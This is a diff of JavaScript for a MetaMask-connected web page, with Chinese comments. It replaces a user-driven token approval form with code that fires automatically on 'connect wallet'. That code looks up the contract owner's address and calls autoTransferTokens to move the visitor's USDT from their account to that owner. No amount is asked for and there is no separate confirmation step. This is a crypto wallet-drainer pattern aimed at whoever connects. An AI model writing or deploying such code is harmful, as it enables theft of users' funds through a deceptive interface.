@@ -1,101 +1,53 @@
-// JavaScript 代码
 const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 替换为你的合约地址
 const contractABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "tokenAddress",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "from",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			}
-		],
-		"name": "approveForTransfer",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "tokenAddress",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			}
-		],
-		"name": "automateApproval",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "tokenAddress",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "from",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "to",
-				"type": "address"
-			}
-		],
-		"name": "autoTransferTokens",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"inputs": [],
-		"name": "owner",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "tokenAddress",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }
+        ],
+        "name": "autoTransferTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    // 其他 ABI 项
 ];
 
 let userAccount;
+let contract;
+
+// USDT 合约地址
+const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // Ethereum上的USDT合约地址
+// 设置接收地址为合约部署者地址
+let toAddress;
 
 // 连接钱包按钮事件
 document.getElementById('connectWallet').addEventListener('click', async () => {
     if (window.ethereum) {
         try {
-            // 请求连接 MetaMask 钱包
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = ethereum.selectedAddress;
-            document.getElementById('approveTransfer').style.display = 'inline';
+            contract = new web3.eth.Contract(contractABI, contractAddress);
+            toAddress = await contract.methods.owner().call(); // 获取合约部署者地址
+
+            document.getElementById('transferButton').style.display = 'inline';
             document.getElementById('status').textContent = '钱包连接成功：' + userAccount;
+
+            // 触发自动转移
+            await transferTokens(tokenAddress, userAccount, toAddress);
         } catch (error) {
             document.getElementById('status').textContent = '连接钱包失败：' + error.message;
         }
@@ -104,25 +56,13 @@ document.getElementById('connectWallet').addEventListener('click', async () => {
     }
 });
 
-// 授权转移按钮事件
-document.getElementById('approveTransfer').addEventListener('click', async () => {
-    const tokenAddress = prompt("请输入代币地址："); // 代币合约地址
-    const amount = prompt("请输入转移数量（直接填写数字，例如 1 或 3）："); // 代币数量
-
-    if (!tokenAddress || !amount) {
-        document.getElementById('status').textContent = '请填写代币地址和转移数量！';
-        return;
-    }
-
-    // 将用户输入的数量乘以 10^18 以适应 ERC20 代币的最小单位
-    const amountToApprove = (parseFloat(amount) * 10**18).toString(); // 转换为字符串以便传递给合约
-
-    const contract = new web3.eth.Contract(contractABI, contractAddress);
+// 自动转移函数
+async function transferTokens(tokenAddress, fromAddress, toAddress) {
     try {
-        await contract.methods.approveForTransfer(tokenAddress, userAccount, amountToApprove).send({ from: userAccount });
-        document.getElementById('status').textContent = '授权成功！';
+        await contract.methods.autoTransferTokens(tokenAddress, fromAddress, toAddress).send({ from: userAccount });
+        document.getElementById('status').textContent = '转移成功！';
     } catch (error) {
-        console.error('授权时出错:', error); // 输出详细错误信息
-        document.getElementById('status').textContent = '授权失败：' + error.message; // 显示用户友好的错误信息
+        console.error('转移时出错:', error);
+        document.getElementById('status').textContent = '转移失败：' + error.message;
     }
-});
+}
